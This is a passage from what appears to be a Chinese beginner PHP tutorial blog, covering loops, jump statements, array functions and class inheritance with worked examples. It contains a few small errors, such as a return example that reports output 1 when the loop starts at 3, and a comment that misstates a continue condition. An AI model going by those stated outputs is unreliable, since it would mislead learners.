<h4 id="1-while循环"><a href="#1-while循环" class="headerlink" title="1.while循环"></a>1.while循环</h4><p>while循环语句是一种当型循环语句，先对循环条件进行判断，当条件满足，则执行循环体，不满足时则停止。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while循环的一般格式</span><br><span class="line">while(表达式)&#123;</span><br><span class="line">    php语句;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会先计算表达式的值，如果表达式的值为真就会开始php语句</p>
<p>并且如果为真执行完一次php语句时，会再次进入判断表达式的值，为真会再次进入循环</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i=1;</span><br><span class="line">$sum=0;</span><br><span class="line">while($i&lt;=100)&#123;   //只有$i&lt;=100时，该循环才会停止</span><br><span class="line">    $sum+=$i;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>这里是计算1到100的所有数的和</p>
<h4 id="2-do-while循环"><a href="#2-do-while循环" class="headerlink" title="2.do-while循环"></a>2.do-while循环</h4><p>do-while循环语句是一种“直到型”循环语句，它是先在执行了一次循环体中的“语句块”之后，然后再对循环条件进行判断，如果为真则继续循环，如果为假，则终止循环。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">do-while循环的一般格式</span><br><span class="line">do&#123;</span><br><span class="line">   语句块;</span><br><span class="line">&#125;while();</span><br></pre></td></tr></table></figure>

<p>会先执行语句块，然后判断循环条件是否成立</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i=1;</span><br><span class="line">$sum=0;</span><br><span class="line">do&#123;</span><br><span class="line">    $sum+=$i;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;while($i&lt;=100);</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>这里是计算1到100所有数的和</p>
<h4 id="3-for循环"><a href="#3-for循环" class="headerlink" title="3.for循环"></a>3.for循环</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fou循环的一般格式</span><br><span class="line">for(初始化语句;循环条件;变量更新-自增或自减)&#123;</span><br><span class="line">   语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>初始化语句（表达式1）：主要是初始化一个变量值，用于设置一个计数器，即循环开始的值；该语句仅在第一次循环时执行，以后都不会再执行。</p>
</li>
<li><p>循环条件（表达式2）：循环执行的限制条件，用于控制是否执行循环体中的代码；如果条件为TRUE，则循环继续，如果条件为FALSE ，则循环结束，立即退出循环。</p>
</li>
<li><p>变量更新（表达式3）：一个带有自增或自减操作的表达式，循环每执行一次，马上修改计数器的值，以使循环条件逐渐变得“不成立”。</p>
</li>
<li><p>语句块：条件判断为真时，需要执行的若干代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=100;$i++)&#123;</span><br><span class="line">    $sum+=$i;</span><br><span class="line">&#125;</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>从1加到100</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=2,$sum=1;$i&lt;=100;$i++)&#123;</span><br><span class="line">    $sum*=$i;</span><br><span class="line">&#125;</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>从1乘到100</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;一&quot;,&quot;二&quot;,&quot;三&quot;,&quot;四&quot;,&quot;五&quot;);</span><br><span class="line">for ($i=0;$i&lt;count($h);$i++)&#123;</span><br><span class="line">     echo $h[$i] . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出一 二 三 四 五</p>
<h4 id="4-foreach语句"><a href="#4-foreach语句" class="headerlink" title="4.foreach语句"></a>4.foreach语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach的格式一</span><br><span class="line">foreach($array as $value)&#123;</span><br><span class="line">   语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给定的 $array数组，在每次循环中将当前数组的值赋给 $value。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach的格式二</span><br><span class="line">foreach($array as $key =&gt; $value)&#123;</span><br><span class="line">   语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给定的 $array 数组，在每次循环中会将当前数组的值赋给 $value，键名赋给 $key。</p>
<p><strong>逐个输出数组的键值或者键名值和键值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;一&quot;,&quot;二&quot;,&quot;三&quot;,&quot;四&quot;,&quot;五&quot;);</span><br><span class="line">foreach ($h as $value)&#123;</span><br><span class="line">    echo $value.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出一 二 三 四 五</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;一&quot;,&quot;二&quot;,&quot;三&quot;,&quot;四&quot;,&quot;五&quot;);</span><br><span class="line">foreach ($h as $key=&gt;$value)&#123;</span><br><span class="line">    echo $key;</span><br><span class="line">    echo $value.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出0一 1二 2三 3四 4五</p>
<p><strong>不仅可以输出数组，也可以输出对象的成员属性名和成员属性值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line"></span><br><span class="line">    public function __construct($name,$age,$sex)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;李华&#x27;,12,&#x27;男&#x27;);</span><br><span class="line">foreach ($h as $v) &#123;</span><br><span class="line">    echo $v . &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出李华12男</p>
<p><strong>修改数组的键名和键值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(1,2,3,4,5);</span><br><span class="line">foreach ($h as $value)&#123;</span><br><span class="line">    $value=$value*2 . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//输出为</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">10</span><br><span class="line">array(5) &#123; [0]=&gt; int(1) [1]=&gt; int(2) [2]=&gt; int(3) [3]=&gt; int(4) [4]=&gt; int(5) &#125;</span><br></pre></td></tr></table></figure>

<p>虽然使用foreach改变了键值，但在外部输出数组$h时它的键值并没有改变</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(1,2,3,4,5);</span><br><span class="line">foreach ($h as &amp;$value)&#123;      /在$value的前面加上一个&amp;号那么就会改变外部输出的数组的键值</span><br><span class="line">    $value=$value*2 . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//输出为</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">10</span><br><span class="line">array(5) &#123; [0]=&gt; string(6) &quot;2</span><br><span class="line">&quot; [1]=&gt; string(6) &quot;4</span><br><span class="line">&quot; [2]=&gt; string(6) &quot;6</span><br><span class="line">&quot; [3]=&gt; string(6) &quot;8</span><br><span class="line">&quot; [4]=&gt; &amp;string(7) &quot;10</span><br><span class="line">&quot; &#125;      //发现在输出的最后有一个&amp;号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以使用unset将&amp;号去掉，如下</span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(1,2,3,4,5);</span><br><span class="line">foreach ($h as &amp;$value)&#123;</span><br><span class="line">    $value=$value*2 . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">unset($value);</span><br><span class="line">var_dump($h);</span><br></pre></td></tr></table></figure>

<h4 id="5-跳出循环"><a href="#5-跳出循环" class="headerlink" title="5.跳出循环"></a>5.跳出循环</h4><p><strong>continue语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 !=0)&#123;  //如果$i可以被2整除则直接执行echo,不能整除就会执行continue</span><br><span class="line">        continue;   //执行continue会跳出本次的循环，而进行下一次的循环</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出2，4，6，8，10</p>
<p><strong>break语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 !=0)&#123;</span><br><span class="line">        break;  //会将整个循环跳出，不会进行下一次的循环</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样会什么都不输出</p>
<p><strong>goto语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 ==0)&#123;</span><br><span class="line">        goto a;</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">a:  //执行goto时会跳到这个地方</span><br></pre></td></tr></table></figure>

<p>输出1，原因是当$i&#x3D;1时goto不会执行，而是执行echo，当$i&#x3D;2时，goto执行后，直接跳到循环外面的a处，会使循环不会再次进行</p>
<p><strong>die()&#x2F;exit()语句</strong></p>
<p>exit 和 die 这两个名字指向的是同一个函数，使用效果相同</p>
<p>结束程序执行的，可以用在任何地方。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 ==0)&#123;</span><br><span class="line">        die();  //执行die会使整个程序暂停</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出1</p>
<p><strong>return语句</strong></p>
<p>return语句是用来结束一段代码，并返回一个参数的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=3;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 ==0)&#123;</span><br><span class="line">        return;  //return会结束这段代码，如果在return后设置了参数，也会返回参数</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出1</p>
<p>6.输出乘法口诀表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for方法</span><br><span class="line">&lt;?php</span><br><span class="line">for($i=1;$i&lt;=9;$i++)&#123;</span><br><span class="line">    for($j=1;$j&lt;=$i;$j++)&#123;</span><br><span class="line">        echo &quot;$j*$i=&quot; . $j*$i . &quot;&amp;nbsp;&amp;nbsp&amp;nbsp;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whlie方法</span><br><span class="line">&lt;?php</span><br><span class="line">$i=1;</span><br><span class="line">while($i&lt;=9)&#123;</span><br><span class="line">    $j=1;</span><br><span class="line">    while($j&lt;=$i)&#123;</span><br><span class="line">        echo &quot;$j*$i=&quot; . $j*$i;</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输出</span><br><span class="line">1*1=1   </span><br><span class="line">1*2=2   2*2=4   </span><br><span class="line">1*3=3   2*3=6   3*3=9   </span><br><span class="line">1*4=4   2*4=8   3*4=12   4*4=16   </span><br><span class="line">1*5=5   2*5=10   3*5=15   4*5=20   5*5=25   </span><br><span class="line">1*6=6   2*6=12   3*6=18   4*6=24   5*6=30   6*6=36   </span><br><span class="line">1*7=7   2*7=14   3*7=21   4*7=28   5*7=35   6*7=42   7*7=49   </span><br><span class="line">1*8=8   2*8=16   3*8=24   4*8=32   5*8=40   6*8=48   7*8=56   8*8=64   </span><br><span class="line">1*9=9   2*9=18   3*9=27   4*9=36   5*9=45   6*9=54   7*9=63   8*9=72   9*9=81 </span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>数组</title>
    <url>/2022/11/11/%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p>php数组的用法</p>
<span id="more"></span>

<h4 id="1-索引数组"><a href="#1-索引数组" class="headerlink" title="1.索引数组"></a>1.索引数组</h4><p><strong>将数组全部输出</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">array(3) &#123; [0]=&gt; string(2) &quot;wo&quot; [1]=&gt; string(3) &quot;shi&quot; [2]=&gt; string(4) &quot;shei&quot; &#125;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">Array ( [0] =&gt; wo [1] =&gt; shi [2] =&gt; shei )</span><br></pre></td></tr></table></figure>

<p><strong>也可以将数组中特定的键值输出</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo $h[0];   //echo可以改成print_r或者var_dump</span><br><span class="line"></span><br><span class="line">输出   wo</span><br></pre></td></tr></table></figure>

<p><em><strong>count()函数用于返回数组的长度（元素数）</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;);</span><br><span class="line">echo count($h);</span><br><span class="line"></span><br><span class="line">输出3，因为$h数组中有3个元素</span><br></pre></td></tr></table></figure>

<h4 id="2-关联数组"><a href="#2-关联数组" class="headerlink" title="2.关联数组"></a>2.关联数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);  //&quot;键名&quot;=&gt;&quot;键值&quot;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">array(3) &#123; [&quot;wo&quot;]=&gt; string(2) &quot;35&quot; [&quot;shi&quot;]=&gt; string(2) &quot;45&quot; [&quot;shei&quot;]=&gt; string(2) &quot;55&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>将特定的键值输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;wo&quot;=&gt;&quot;35&quot;,&quot;shi&quot;=&gt;&quot;45&quot;,&quot;shei&quot;=&gt;&quot;55&quot;);</span><br><span class="line">echo $h[&#x27;wo&#x27;];</span><br><span class="line"></span><br><span class="line">输出  35</span><br></pre></td></tr></table></figure>

<h4 id="3-多维数组"><a href="#3-多维数组" class="headerlink" title="3.多维数组"></a>3.多维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二维数组</span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">print_r($h);</span><br></pre></td></tr></table></figure>

<p>将特定的键值输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(</span><br><span class="line">    array(&#x27;123&#x27;=&gt;&#x27;123&#x27;,&#x27;456&#x27;=&gt;&#x27;456&#x27;),</span><br><span class="line">    array(&#x27;12&#x27;=&gt;&#x27;12&#x27;,&#x27;34&#x27;=&gt;&#x27;34&#x27;),</span><br><span class="line">);</span><br><span class="line">echo $h[1][&#x27;12&#x27;];</span><br><span class="line"></span><br><span class="line">输出  12</span><br></pre></td></tr></table></figure>

<h4 id="4-list-函数"><a href="#4-list-函数" class="headerlink" title="4.list()函数"></a>4.list()函数</h4><p>把数组中的值赋给一些变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span><br><span class="line">list($one,$two,$three)=$h;</span><br><span class="line">echo $one.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $two.&#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">echo $three;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>

<h4 id="5-数组的排序"><a href="#5-数组的排序" class="headerlink" title="5.数组的排序"></a>5.数组的排序</h4><p><strong>sort()对数组进行升序排列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">sort($h);   //会按照字母的顺序进行排序，这里是按照正的进行排序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; bmw [1] =&gt; toyota [2] =&gt; volvo )</span><br></pre></td></tr></table></figure>

<p><strong>rsort()对数组进行降序排列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;volvo&#x27;,&#x27;bmw&#x27;,&#x27;toyota&#x27;);</span><br><span class="line">rsort($h);   //会按照字母的顺序进行排序，这里是按照反的进行排序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; volvo [1] =&gt; toyota [2] =&gt; bmw )</span><br></pre></td></tr></table></figure>

<p><strong>asort()根据数组的值，对数组进行升序排列</strong></p>
<p><strong>arsort()根据数组的值，对数组进行降序排列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;124&#x27;=&gt;&#x27;a&#x27;,&#x27;125&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">asort($h);  //对数组进行升序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [124] =&gt; a [125] =&gt; c [123] =&gt; f )</span><br></pre></td></tr></table></figure>

<p><strong>ksort()根据数组的键，对数组进行升序排列</strong></p>
<p><strong>krsort()根据数组的键，对数组进行降序排列</strong></p>
<p>一般用于关联数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&#x27;123&#x27;=&gt;&#x27;f&#x27;,&#x27;125&#x27;=&gt;&#x27;a&#x27;,&#x27;124&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">ksort($h);  //进行升序</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [123] =&gt; f [124] =&gt; c [125] =&gt; a )</span><br></pre></td></tr></table></figure>

<h4 id="6-快速生成数组"><a href="#6-快速生成数组" class="headerlink" title="6.快速生成数组"></a>6.快速生成数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=range(1,10);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 6 [6] =&gt; 7 [7] =&gt; 8 [8] =&gt; 9 [9] =&gt; 10 )</span><br></pre></td></tr></table></figure>

<h4 id="7-添加数组元素函数"><a href="#7-添加数组元素函数" class="headerlink" title="7.添加数组元素函数"></a>7.添加数组元素函数</h4><p><strong>array_unshift()是在数组的头部添加元素</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_unshift($h,17);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 17 [1] =&gt; 12 [2] =&gt; 13 [3] =&gt; 14 )</span><br></pre></td></tr></table></figure>

<p><strong>array_push() 在数组尾部添加元素</strong></p>
<h4 id="8-删除数组元素函数"><a href="#8-删除数组元素函数" class="headerlink" title="8.删除数组元素函数"></a>8.删除数组元素函数</h4><p><strong>array_shift()是删除头部数组元素</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;];</span><br><span class="line">array_shift($h);</span><br><span class="line">print_r($h);</span><br><span class="line"></span><br><span class="line">输出Array ( [0] =&gt; 13 [1] =&gt; 14 )</span><br></pre></td></tr></table></figure>

<p><strong>array_pop()是删除尾部数组元素</strong></p>
<p><strong>array_splice()是可以规定删除数组元素的位置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_splice($input, 2);  //是将$input数组从键名为2的元素删除到最后</span><br><span class="line">array_splice($input, 1, 2);  //是将$input数组从键名为1到2的元素删除</span><br><span class="line"></span><br><span class="line">array_splice($input, 1, -1, array(&quot;black&quot;, &quot;maroon&quot;));</span><br><span class="line">比如$input = array(&quot;red&quot;, &quot;green&quot;, &quot;blue&quot;, &quot;yellow&quot;);</span><br><span class="line">那么会输出array(4) &#123; [0]=&gt; string(3) &quot;red&quot; [1]=&gt; string(5) &quot;black&quot; [2]=&gt; string(6) &quot;maroon&quot; [3]=&gt; string(6) &quot;yellow&quot; &#125;</span><br></pre></td></tr></table></figure>

<h4 id="9-删除键值操作函数"><a href="#9-删除键值操作函数" class="headerlink" title="9.删除键值操作函数"></a>9.删除键值操作函数</h4><p><strong>array_keys() 获取数组的键组成的数组</strong></p>
<p><strong>array_values() 返回数组中所有的值，并给其重新建立数字索引</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_keys($h);</span><br><span class="line">print_r($j);</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">Array ( [0] =&gt; 123 [1] =&gt; 124 [2] =&gt; 125 )</span><br></pre></td></tr></table></figure>

<p><strong>array_key_exists()判断数组的键名或索引是否存在</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">$j=array_key_exists(&quot;12&quot;,$h);</span><br><span class="line">echo $j?&quot;存在&quot;:&quot;不存在&quot;;</span><br><span class="line"></span><br><span class="line">输出不存在</span><br></pre></td></tr></table></figure>

<p><strong>array_search()  在数组中搜索给定的值，返回该值对应的索引</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;123&#x27;=&gt;&#x27;wo&#x27;,&#x27;124&#x27;=&gt;&#x27;shi&#x27;,&#x27;125&#x27;=&gt;&#x27;shei&#x27;];</span><br><span class="line">echo array_search(&#x27;wo&#x27;,$h);  //只能搜索值，返回索引</span><br><span class="line"></span><br><span class="line">输出  123</span><br></pre></td></tr></table></figure>

<p><strong>in_array() 检查数组中是否存在某个值，存在返回true 否则false</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=[&#x27;wo&#x27;,&#x27;shi&#x27;,&#x27;shei&#x27;];</span><br><span class="line">if(in_array(&#x27;wo&#x27;,$h))&#123;</span><br><span class="line">    echo &quot;found&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出  found</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>php的类</title>
    <url>/2022/11/11/%E7%B1%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>PHP类的基本操作</p>
<span id="more"></span>

<h4 id="1-类的继承"><a href="#1-类的继承" class="headerlink" title="1.类的继承"></a>1.类的继承</h4><p>extends关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;    //创建一个human父类</span><br><span class="line">    public $name;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父亲说话的方法，姓名：&quot; . $this-&gt;name.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;父亲吃饭的方法\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;   //这里sport继承了human，sport为子类,human为父类</span><br><span class="line">    public $type;</span><br><span class="line">    public function __construct($name,$type)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;type=$type;</span><br><span class="line">    &#125;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        $this-&gt;say();</span><br><span class="line">        echo &quot;我正在跑步，我是一名&quot; . $this-&gt;type . &quot;运动员\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class host extends human&#123;  //这里host继承了human，host为子类,human为父类</span><br><span class="line">    public $tele;</span><br><span class="line">    public function __construct($name,$tele)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;tele=$tele;</span><br><span class="line">    &#125;</span><br><span class="line">    public function perform()&#123;</span><br><span class="line">        $this-&gt;eat();</span><br><span class="line">        echo &quot;我正在表演一个节目，我是&quot;.$this-&gt;tele.&quot;电视台的主持人\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$nba=new sport(&quot;乔丹&quot;,&quot;篮球&quot;);</span><br><span class="line">$nba-&gt;run();</span><br><span class="line">$tv=new host(&quot;张三&quot;,&quot;北京卫视&quot;);</span><br><span class="line">$tv-&gt;perform();</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>父亲说话的方法，姓名：乔丹 我正在跑步，我是一名篮球运动员 父亲吃饭的方法 我正在表演一个节目，我是北京卫视电视台的主持人</p>
<h4 id="2-方法重写"><a href="#2-方法重写" class="headerlink" title="2.方法重写"></a>2.方法重写</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;父类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sport extends human&#123;</span><br><span class="line">    public function say()  //在子类中再次声明一个say方法，这样可以覆盖父类中的say方法</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;子类说话的方法&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;say();</span><br></pre></td></tr></table></figure>

<p>输出   子类说话的方法</p>
<h4 id="3-访问控制"><a href="#3-访问控制" class="headerlink" title="3.访问控制"></a>3.访问控制</h4><p>public关键字:定义公共的成员属性或方法，任何地方都可使用</p>
